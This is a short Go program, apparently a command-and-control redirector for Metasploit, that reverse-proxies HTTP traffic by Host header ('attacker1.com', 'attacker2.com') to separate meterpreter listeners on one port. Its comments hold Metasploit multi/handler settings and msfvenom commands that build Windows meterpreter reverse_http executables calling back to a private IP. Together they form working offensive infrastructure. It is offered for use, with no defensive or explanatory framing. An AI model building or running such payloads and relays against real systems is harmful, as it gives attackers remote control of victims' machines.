package main

import (
	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
	"net/http"
	"net/http/httputil"
	"net/url"
)

var (
	hostProxy = make(map[string]string)
	proxies   = make(map[string]*httputil.ReverseProxy)
)

/*
msf6 exploit(multi/handler) > set LHOST 192.168.1.67
LHOST => 192.168.1.67
msf6 exploit(multi/handler) > set LPORT 80
LPORT => 80
msf6 exploit(multi/handler) > set ReverseLIstenerBindAddress 0.0.0.0
ReverseLIstenerBindAddress => 0.0.0.0
msf6 exploit(multi/handler) > set ReverseListenerBindPort 10080
ReverseListenerBindPort => 10080
msf6 exploit(multi/handler) > exploit -j -z
*/

func init() {
	hostProxy["attacker1.com"] = "http://192.168.152.149:10080" //msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.1.67 LPORT=80 HttpHostHeader=attacker1.com -f exe -o p1.exe
	hostProxy["attacker2.com"] = "http://192.168.152.149:20080" //msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.1.67 LPORT=80 HttpHostHeader=attacker2.com -f exe -o p2.exe

	for k, v := range hostProxy {
		remote, err := url.Parse(v)
		if err != nil {
			log.Fatal("unable to parse proxy target")
		}
		proxies[k] = httputil.NewSingleHostReverseProxy(remote)
	}
}

func main() {
	r := mux.NewRouter()
	for host, proxy := range proxies {
		r.Host(host).Handler(proxy)
	}
	log.Fatal(http.ListenAndServe(":80", r))
}
